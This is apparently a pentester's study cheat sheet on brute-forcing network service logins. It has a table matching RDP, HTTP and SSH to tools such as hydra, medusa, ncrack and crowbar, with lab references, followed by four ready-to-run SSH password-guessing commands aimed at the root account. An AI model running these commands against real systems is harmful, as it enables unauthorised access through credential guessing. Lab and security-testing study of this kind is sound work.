# bruteforcing services
|service|tool|desc|
|---|---|---|
|rdp|crowbar|best RDP brute forcer|
|http|medusa|http auth|
|http|hydra|http post form|
|ssh|medusa|ippsec example vulnhub DC-9 - works great|
|ssh|ncrack|ippsec example vulnhub DC-9, in kali apt|

# command shortlist

# SSH
from hacktricks
```
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```




